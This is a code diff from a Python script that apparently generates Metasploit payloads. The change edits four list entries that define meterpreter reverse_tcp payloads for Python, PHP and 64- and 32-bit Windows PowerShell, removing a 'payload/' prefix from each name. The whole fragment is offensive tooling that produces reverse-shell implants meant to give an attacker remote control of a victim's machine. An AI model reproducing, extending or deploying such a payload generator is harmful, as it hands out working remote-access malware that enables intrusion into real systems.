@@ -47,10 +47,10 @@ def main():
     print("\n[*] Generating the following payloads:")
 
     paylist = []
-    paylist.append({'payload':'payload/python/meterpreter/reverse_tcp','format':'raw','file':'mtrprtr_python','ext':'py'})
-    paylist.append({'payload':'payload/php/meterpreter/reverse_tcp','format':'raw','file':'mtrprtr_php','ext':'php'})
-    paylist.append({'payload':'payload/windows/x64/meterpreter/reverse_tcp','format':'psh-cmd','file':'mtrprtr_64psh-cmd','ext':'cmd'})
-    paylist.append({'payload':'payload/windows/meterpreter/reverse_tcp','format':'psh-cmd','file':'mtrprtr_psh-cmd','ext':'cmd'})
+    paylist.append({'payload':'python/meterpreter/reverse_tcp','format':'raw','file':'mtrprtr_python','ext':'py'})
+    paylist.append({'payload':'php/meterpreter/reverse_tcp','format':'raw','file':'mtrprtr_php','ext':'php'})
+    paylist.append({'payload':'windows/x64/meterpreter/reverse_tcp','format':'psh-cmd','file':'mtrprtr_64psh-cmd','ext':'cmd'})
+    paylist.append({'payload':'windows/meterpreter/reverse_tcp','format':'psh-cmd','file':'mtrprtr_psh-cmd','ext':'cmd'})
 
     for pkg in paylist:
         payload = pkg['payload']
